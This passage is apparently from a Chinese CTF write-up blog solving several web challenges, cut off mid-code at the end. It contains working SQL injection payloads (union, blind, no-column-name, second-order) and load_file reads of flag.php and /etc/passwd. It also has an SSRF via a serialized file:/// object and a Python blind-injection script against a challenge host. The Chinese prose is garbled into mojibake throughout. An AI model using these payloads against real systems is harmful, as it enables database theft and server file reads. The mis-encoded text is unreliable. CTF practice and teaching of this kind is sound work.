<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span>  </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">233</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data = <span class="keyword">new</span> UserInfo();</span><br><span class="line"><span class="keyword">echo</span> serialize($data);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>åˆ©ç”¨getBlogContentsè°ƒç”¨çš„curlè¿›è¡ŒSSRFæ”»å‡»ï¼Œå››ä¸ªå‚æ•°éƒ½è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°æ˜¯ç¬¬4ä¸ªç”¨æ¥è¯»ç”¨æˆ·æ•°æ®çš„ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload&#x3D;?no&#x3D;-1 union&#x2F;**&#x2F;select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;test&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure>
<p>åœ¨iframeä¸­å¾—åˆ°flagã€‚</p>
<h3 id="éé¢„æœŸè§£">éé¢„æœŸè§£</h3>
<p>æºç æ²¡æœ‰è¿‡æ»¤load_fileå‡½æ•°ï¼Œå¯ä»¥ç›´æ¥åŒ…å«ä¸€ä¸ªæ–‡ä»¶ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?no&#x3D;0+unIon&#x2F;**&#x2F;select+1,load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&#39;),1,1</span><br></pre></td></tr></table></figure>
<blockquote>
<p>load_fileä½¿ç”¨æ¡ä»¶ï¼š</p>
<p>1.ç”¨æˆ·æœ‰å¾ˆé«˜çš„æƒé™</p>
<p>2.çŸ¥é“æ–‡ä»¶çš„ç»å¯¹è·¯å¾„</p>
</blockquote>
<h2 id="BJDCTF-2nd-ç®€å•æ³¨å…¥">BJDCTF 2nd ç®€å•æ³¨å…¥</h2>
<h3 id="è€ƒç‚¹-v13">è€ƒç‚¹</h3>
<ul>
<li>MySQLç›²æ³¨</li>
<li>Pythonè„šæœ¬ç¼–å†™</li>
</ul>
<h3 id="è§£é¢˜-v12">è§£é¢˜</h3>
<p>è®¿é—®<code>robots.txt</code>é¡µé¢æç¤ºæœ‰<code>hint.php</code>ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Only u input the correct password then u can get the flag</span><br><span class="line">and p3rh4ps wants a girl friend.</span><br><span class="line"></span><br><span class="line">select * from users where username&#x3D;&#39;$_POST[&quot;username&quot;]&#39; and password&#x3D;&#39;$_POST[&quot;password&quot;]&#39;;</span><br></pre></td></tr></table></figure>
<p>fuzzä¸€ä¸‹å‘ç°ï¼šç©ºæ ¼å•åŒå¼•å·è¿‡æ»¤ï¼Œ\æ²¡è¿‡æ»¤ï¼Œå¦‚æœæœªå¯¹<code>$_POST[&quot;username&quot;]</code>è¿›è¡Œå…¶ä»–é™åˆ¶ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨åæ–œæ å°†ç¬¬äºŒä¸ªå•å¼•å·è½¬ä¹‰ï¼Œæ­¤æ—¶ç¬¬ä¸€ä¸ªå•å¼•å·å’Œç¬¬ä¸‰ä¸ªå•å¼•å·æ„æˆè¯­å¥ï¼š<code>username='xxxxx', $_POST[&quot;password&quot;]</code>åˆ™å¯è¿›è¡Œç›²æ³¨ã€‚</p>
<p><code>username=admin\  password=or/**/length(database())&gt;0#</code>å›æ˜¾<code>BJD needs to be stronger</code></p>
<p><code>username=admin\  password=or/**/length(database())&lt;0#</code>å›æ˜¾<code>You konw ,P3rh4ps needs a girl friend</code></p>
<p>å†™ç›²æ³¨è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://2cfb1e37-5400-4888-895d-bd5db365a250.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">flag = <span class="string">&#x27;BJD needs to be stronger&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        mid = (high + low) // <span class="number">2</span></span><br><span class="line">        payload = <span class="string">&quot;or/**/if(ascii(substr(password,%d,1))&gt;%d,1,0)#&quot;</span> % (i, mid)</span><br><span class="line">        data[<span class="string">&#x27;password&#x27;</span>] = payload</span><br><span class="line"></span><br><span class="line">        rs = requests.post(url=url, data=data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> rs.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> low != <span class="number">32</span>:</span><br><span class="line">        result += chr(low)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°<code>password:OhyOuFOuNdit</code></p>
<h2 id="SWPUCTF2019-Web1">SWPUCTF2019 Web1</h2>
<h3 id="è€ƒç‚¹-v14">è€ƒç‚¹</h3>
<ul>
<li>äºŒæ¬¡æ³¨å…¥</li>
<li>MySQLæ— åˆ—åæ³¨å…¥</li>
<li>MySQL5.7+ æ–°ç‰¹æ€§</li>
</ul>
<h3 id="çŸ¥è¯†å‚¨å¤‡">çŸ¥è¯†å‚¨å¤‡</h3>
<p>æ— åˆ—åæ³¨å…¥ä¸»è¦æ˜¯é€‚ç”¨äºå·²ç»è·å–åˆ°æ•°æ®è¡¨ï¼Œä½†æ— æ³•æŸ¥è¯¢åˆ—çš„æƒ…å†µä¸‹ï¼Œåœ¨CTFé¢˜ç›®ä¸­å¸¸å¸¸æ˜¯å› ä¸ºinformation_schemaè¢«è¿‡æ»¤çš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨è¿™ç§æ–¹æ³•è·å–åˆ—åã€‚</p>
<p>æ— åˆ—åæ³¨å…¥çš„åŸç†å…¶å®ç±»ä¼¼äºå°†æˆ‘ä»¬ä¸çŸ¥é“çš„åˆ—åï¼Œè¿›è¡Œå–åˆ«åæ“ä½œï¼Œåœ¨å–åˆ«åçš„åŒæ—¶è¿›è¡Œæ•°æ®æŸ¥è¯¢ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬æŸ¥è¯¢çš„å­—æ®µå¤šäºæ•°æ®è¡¨ä¸­åˆ—çš„æ—¶å€™ï¼Œä¼šå‡ºç°æŠ¥é”™ã€‚</p>
<blockquote>
<p>åœ¨ information_schema ä¸­ï¼Œé™¤äº† SCHEMATAã€TABLESã€COLUMNS æœ‰è¡¨ä¿¡æ¯å¤–ï¼Œé«˜ç‰ˆæœ¬çš„ mysql 5.7ä»¥ä¸Šï¼Œè¿˜æœ‰ INNODB_TABLES åŠ INNODB_COLUMNS ä¸­è®°å½•ç€è¡¨ç»“æ„ã€‚</p>
</blockquote>
<p>ä¾‹å¦‚å½“å‰æœ‰ä¸€ä¸ªuserè¡¨</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702211931.png" style="zoom:67%;" />
<p>å‘ç°è¯¥æ•°æ®è¡¨ä¸­æœ‰3åˆ—ï¼Œæˆ‘ä»¬ä½¿ç”¨æ— åˆ—åæŸ¥è¯¢çš„æ–¹å¼å°è¯•æŸ¥è¯¢ä¸€ä¸‹</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702212049.png" style="zoom:67%;" />
<p>å°è¯•å¤šä¸€ä¸ªå­—æ®µæˆ–è€…å°‘ä¸€ä¸ªå­—æ®µè¿›è¡ŒæŸ¥è¯¢ï¼š</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702212208.png" style="zoom:67%;" />
<p>ä»ç„¶æŠ¥é”™ï¼Œè¯æ˜æ— åˆ—åæ³¨å…¥å¿…é¡»ä¸€ä¸€å¯¹åº”æ‰€æŸ¥è¯¢æ•°æ®è¡¨çš„åˆ—æ•°ã€‚</p>
<p>å¯¹ä¸€åˆ—æ•°æ®è¿›è¡ŒæŸ¥è¯¢ï¼š</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702212534.png" style="zoom:67%;" />
<blockquote>
<p>æœ«å°¾çš„ a å¯ä»¥æ˜¯ä»»æ„å­—ç¬¦ï¼Œç”¨äºå‘½åã€‚</p>
</blockquote>
<p>å½“ç„¶ï¼Œå¤šæ•°æƒ…å†µä¸‹ï¼Œ` ä¼šè¢«è¿‡æ»¤ã€‚å½“ ` ä¸èƒ½ä½¿ç”¨çš„æ—¶å€™ï¼Œä½¿ç”¨åˆ«åæ¥ä»£æ›¿ï¼š</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702213855.png" style="zoom:67%;" />
<p>åŒæ—¶æŸ¥è¯¢å¤šä¸ªåˆ—ï¼š</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702214129.png" style="zoom:67%;" />
<h3 id="è§£é¢˜-v13">è§£é¢˜</h3>
<p>æ³¨å†Œadminçš„æ—¶å€™æç¤ºç”¨æˆ·å·²ç»å­˜åœ¨ï¼Œé‚£ä¹ˆå°±éšä¾¿æ³¨å†Œä¸€ä¸ªç”¨æˆ·åï¼Œç™»å½•åå‘è¡¨å¹¿å‘Šï¼Œç‚¹å‡»æŸ¥çœ‹è¯¦æƒ…é¡µï¼Œç¬¬ä¸€ååº”çœ‹urlä¼ å…¥äº†idå­—æ®µï¼Œç»è¿‡æµ‹è¯•åï¼Œidå­—æ®µä¸å­˜åœ¨SQLæ³¨å…¥ã€‚</p>
<p>å†è€ƒè™‘æ˜¯ä¸æ˜¯äºŒæ¬¡æ³¨å…¥ï¼Œå‘è¡¨å¹¿å‘Šåï¼ŒæŸ¥è¯¢å¹¿å‘Šè¯¦æƒ…çš„æ—¶å€™äº§ç”Ÿæ³¨å…¥ã€‚</p>
<p>æµ‹è¯•æ³¨å…¥ç‚¹ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702215827.png" alt=""></p>
<p>ç‚¹å‡»å¹¿å‘Šè¯¦æƒ…</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702215848.png" alt=""></p>
<p>å‘ç°æ•°æ®åº“æŠ¥é”™ä¿¡æ¯ï¼Œè¯æ˜å­˜åœ¨æ³¨å…¥ï¼Œå¯æ ¹æ®æŠ¥é”™çš„ä¿¡æ¯å»æ„é€ sqlæ³¨å…¥è¯­å¥ï¼Œfuzzä¸€ä¸‹è¢«è¿‡æ»¤çš„å­—ç¬¦å’Œç¬¦å·ã€‚</p>
<p>å‘ç°ç©ºæ ¼ï¼Œorï¼Œ#ï¼Œâ€“+ç­‰è¢«è¿‡æ»¤ï¼Œæˆ‘ä»¬ä½¿ç”¨æ³¨é‡Šç¬¦å·æ¥ä»£æ›¿ç©ºæ ¼ã€‚æŠ¥é”™è¿‡æ»¤äº†extractvalue å’Œ updatexmlï¼Œäºæ˜¯è€ƒè™‘ç”¨ union è”åˆæ³¨å…¥ã€‚</p>
<p>å°è¯•é—­åˆå•å¼•å·ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aaa&#39;,&#39;</span><br></pre></td></tr></table></figure>
<p>å…ˆåˆ¤æ–­å­—æ®µçš„ä¸ªæ•°ï¼Œorè¢«è¿‡æ»¤äº†ä¸èƒ½ç”¨order byï¼Œä½†æ˜¯å¯ä»¥ç”¨group byæ¥æ›¿æ¢</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">11&#39;&#x2F;**&#x2F;group&#x2F;**&#x2F;by&#x2F;**&#x2F;22,&#39;</span><br></pre></td></tr></table></figure>
<p>åˆ¤æ–­å›æ˜¾ä½</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">11&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703100141.png" alt=""></p>
<p>æŸ¥è¯¢ä¸€ä¸‹æ•°æ®åº“åç§°å’Œç‰ˆæœ¬</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">11&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,database(),version(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703101346.png" alt=""></p>
<p>ç”±äºorè¢«è¿‡æ»¤ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨information_schemaï¼Œä½†æ˜¯æ ¹æ®ä¸Šé¢çš„çŸ¥è¯†å‚¨å¤‡ï¼Œå¦‚æœæ•°æ®è¡¨çš„å¼•æ“æ˜¯<code>innodb</code>ï¼Œ è¿˜å¯ä»¥ç”¨<code>mysql.innodb_table_stats</code>è·å–è¡¨å</p>
<blockquote>
<p><a href="https://mariadb.com/kb/en/mysqlinnodb_table_stats/">https://mariadb.com/kb/en/mysqlinnodb_table_stats/</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">11&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats&#x2F;**&#x2F;where&#x2F;**&#x2F;database_name&#x3D;database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703102458.png" alt=""></p>
<p>æˆ‘ä»¬æ— æ³•çŸ¥é“åˆ—åï¼Œå¯ä»¥é€šè¿‡æ— åˆ—åæ³¨å…¥çš„æ–¹å¼è¿›è¡Œæ³¨å…¥ï¼Œå…ˆæŸ¥è¯¢usersè¡¨ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">11&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from&#x2F;**&#x2F;(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703103327.png" alt=""></p>
<h3 id="åè®°">åè®°</h3>
<p>å¦‚æœè¿‡æ»¤äº†é€—å·ï¼Œå¯ä»¥ç”¨joinå…³é”®å­—è¿æ¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from users union select * from (select 1)a join (select 2)b join (select 3)c;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  1 | 2        | 3          |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<h2 id="ç½‘é¼æ¯2018-comment">ç½‘é¼æ¯2018 comment</h2>
<h3 id="è€ƒç‚¹-v15">è€ƒç‚¹</h3>
<ul>
<li>Gitæºç æ¢å¤</li>
<li>ä»£ç å®¡è®¡</li>
<li>äºŒæ¬¡æ³¨å…¥</li>
</ul>
<h3 id="è§£é¢˜-v14">è§£é¢˜</h3>
<p>ä¸Šæ¥æ²¡ä»€ä¹ˆæ€è·¯ï¼Œå…ˆç”¨dirmapæ‰«ä¸€éå‘ç°Gitæ–‡ä»¶å¤¹ï¼Œç”¨GitHackæŠŠæºç dumpä¸‹æ¥ï¼Œåªæœ‰ä¸€ä¸ª<code>write_do.php</code>æ–‡ä»¶ï¼Œå¹¶ä¸”ä¸å®Œæ•´ï¼Œéœ€è¦æŸ¥çœ‹æäº¤å†å²ã€‚å› ä¸ºlijiejieçš„GitHackä¸èƒ½æŠŠ.gitæ–‡ä»¶å¤¹åŒæ—¶dumpä¸‹æ¥ï¼Œæ‰€ä»¥è¿™é‡Œæ¢æˆwangyihangçš„GitHackerã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200705112838.png" alt=""></p>
<p>æŸ¥çœ‹ç¬¬ä¸€ä¸ªcommit</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c</span><br><span class="line">HEAD ç°åœ¨ä½äº e5b2a24 WIP on master: bfbdf21 add write_do.php</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°<code>write_do.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    $category = addslashes($_POST[<span class="string">&#x27;category&#x27;</span>]);</span><br><span class="line">    $title = addslashes($_POST[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;insert into board</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                title = &#x27;<span class="subst">$title</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    $bo_id = addslashes($_POST[<span class="string">&#x27;bo_id&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;select category from board where id=&#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    <span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line">    $content = addslashes($_POST[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">&quot;Location: ./comment.php?id=<span class="subst">$bo_id</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>æäº¤è¯„è®ºè¿˜éœ€è¦ç™»å½•ï¼Œæ ¹æ®ç™»å½•æ¡†ä¸Šçš„place_holdï¼Œåº”è¯¥æ˜¯è¦çˆ†ç ´å¯†ç çš„åä¸‰ä½ï¼Œå†™ä¸€ä¸ªpythonè„šæœ¬è·‘ä¸€ä¸‹å°±å‡ºæ¥ï¼Œä»£ç å†™å¤ªçƒ‚ä¸è´´äº†ï¼š<code>zhangwei/zhangwei666</code></p>
<p>æ¥ç€å®¡è®¡æºç ï¼Œå¯ä»¥çœ‹åˆ°ä¸Šé¢ç¬¬12-14è¡Œéƒ½å¯¹ POST ä¼ æ¥category ã€ title ã€contentä¸‰ä¸ªå‚æ•°è¿›è¡Œäº†ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰ï¼Œç„¶è€Œåœ¨ç¬¬28è¡Œå’Œç¬¬30-33è¡Œå¤„ç›´æ¥å°†ä»æ•°æ®åº“ä¸­å–å‡ºçš„æ•°æ®ï¼Œæœªç»ä»»ä½•è¿‡æ»¤æ‹¼æ¥åˆ°SQLè¯­å¥ ä¸­ï¼Œå¹¶ä¸”contentçš„å€¼ä¼šæ˜¾ç¤ºåœ¨é¡µé¢ä¸Šï¼Œè¿™å°±å­˜åœ¨äºŒæ¬¡æ³¨å…¥ ã€‚</p>
<blockquote>
<p>addslashesä¼šå°†ä¼ å…¥çš„ä¿¡æ¯éƒ½ä¼šè¿›è¡Œè½¬ä¹‰ï¼Œä½†æ˜¯æ•°æ®åº“ä¼šè‡ªåŠ¨æ¸…é™¤åæ–œæ ã€‚</p>
</blockquote>
<p>ä¸‹é¢è¯´è¯´äºŒæ¬¡æ³¨å…¥çš„æ”»å‡»è¿‡ç¨‹ï¼š</p>
<ul>
<li>
<p>å…ˆè¿›å…¥ write æ–¹æ³•ï¼Œå°†payloadï¼š <code>',content=database(),/*</code> æ’å…¥ board è¡¨çš„ category å­—æ®µä¸­</p>
<p>æ­¤æ—¶payloadä¸º<code>title=111&amp;category=',content=database(),/*&amp;content=1</code></p>
</li>
<li>
<p>å†è¿›å…¥ comment æ–¹æ³•ï¼Œç¨‹åºå°† board è¡¨ä¸­çš„ category å­—æ®µå–å‡ºï¼Œæ²¡è¿›è¡Œè¿‡æ»¤ï¼Œæ‹¼æ¥åˆ°æ–°çš„ insert è¯­å¥ä¸­ã€‚ç”±äºæˆ‘ä»¬ä¹‹å‰çš„ payload ä¸­å¸¦æœ‰ /* ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦é—­åˆå®ƒï¼Œå³æˆ‘ä»¬åœ¨è¯„è®ºå¤„æäº¤ <code>*/#</code> (å¯¹åº” content å˜é‡çš„å€¼)ï¼Œç”¨äºé—­åˆ<code>/*</code></p>
</li>
<li>
<p>ç„¶åç¨‹åºæ‰§è¡Œç¬¬äºŒä¸ªSQLè¯­å¥ï¼Œå¹¶å°†ç”¨æˆ·æäº¤çš„contentå€¼æ˜¾ç¤ºå‡ºæ¥ï¼Œè€Œæˆ‘ä»¬çš„ payload ï¼š <code>',content=user(),/*</code> å°±ä¼šæ˜¾ç¤ºå‡ºå½“å‰ç”¨æˆ·ã€‚</p>
</li>
</ul>
<p>æŸ¥çœ‹å½“å‰ç”¨æˆ·</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200705143030.png" style="zoom:50%;" />
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200705143103.png" style="zoom:50%;" />
<blockquote>
<p>å¦‚æœæ˜¯rootç”¨æˆ·ï¼Œä¸€èˆ¬ <strong>flag</strong> å°±ä¸ä¼šåœ¨æ•°æ®åº“é‡Œé¢(å› ä¸ºå¦‚æœåœ¨æ•°æ®åº“ä¸­ï¼Œä¸éœ€è¦è¿™ä¹ˆé«˜çš„æƒé™ï¼Œå®é™…ä¹Ÿç¡®å®æ²¡æœ‰ã€‚</p>
</blockquote>
<p>åº”è¯¥æ˜¯è¦ç”¨SQLè¯­å¥è¯»å–flagæ–‡ä»¶äº†ã€‚</p>
<p>å…ˆç”¨<code>/etc/passwd</code>åšä¸€ä¸ªéªŒè¯</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200705143339.png" style="zoom: 50%;" />
<p>æœ‰ä¸€ä¸ªwwwç”¨æˆ·ï¼ŒæŸ¥çœ‹ä»–çš„å†å²å‘½ä»¤</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200705143628.png" style="zoom:50%;" />
<p>å¯ä»¥å‘ç°ä»–åˆ é™¤äº†ä¸€ä¸ª<code>.DS_Store</code>æ–‡ä»¶ï¼Œä½†æ˜¯è¿˜å­˜åœ¨äº<code>/tmp/html</code>ç›®å½•ä¸­ï¼Œç”±äºè¿™ä¸ªæ–‡ä»¶æœ‰å¾ˆå¤šä¸å¯è§å­—ç¬¦ä¸èƒ½ç›´æ¥ç”¨ç¼–è¾‘å™¨æ‰“å¼€ï¼Œå…ˆå¯¹å…¶è¿›è¡Œ16è¿›åˆ¶ç¼–ç </p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200705144029.png" alt=""></p>
<p>å†è½¬æ¢æˆASCII</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200705145015.png" alt=""></p>
<p>flagæ–‡ä»¶å<code>flag_8946e1ff1ee3e40f.php</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200705145339.png" alt=""></p>
<p>å†è§£ç å°±å¯ä»¥å¾—åˆ°flagã€‚</p>
<h2 id="CISCN2019-easyweb">CISCN2019 easyweb</h2>
<h3 id="è€ƒç‚¹-v16">è€ƒç‚¹</h3>
<ul>
<li>æºç æ³„éœ²</li>
<li>MySQLç›²æ³¨</li>
<li>PHPçŸ­æ ‡ç­¾</li>
</ul>
<h3 id="è§£é¢˜-v15">è§£é¢˜</h3>
<p>åˆæ˜¯ä¸€é“ç›²æ³¨çš„é¢˜ç›®ï¼Œè¿˜æ˜¯æ²¡æœ‰åšå‡ºæ¥ã€‚ã€‚ã€‚ã€‚ã€‚</p>
<p><code>robots.txt</code>æç¤ºæœ‰bakå¤‡ä»½æ–‡ä»¶ï¼Œå°è¯•äº†<code>index.php.bak</code>å’Œ<code>user.php.bak</code>æ— æœåç”¨dirmapæ‰«æï¼Œå‘ç°äº†<code>image.php.bak</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">$id=<span class="keyword">isset</span>($_GET[<span class="string">&quot;id&quot;</span>])?$_GET[<span class="string">&quot;id&quot;</span>]:<span class="string">&quot;1&quot;</span>;</span><br><span class="line">$path=<span class="keyword">isset</span>($_GET[<span class="string">&quot;path&quot;</span>])?$_GET[<span class="string">&quot;path&quot;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line"></span><br><span class="line">$id=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,$id);</span><br><span class="line">$path=str_replace(<span 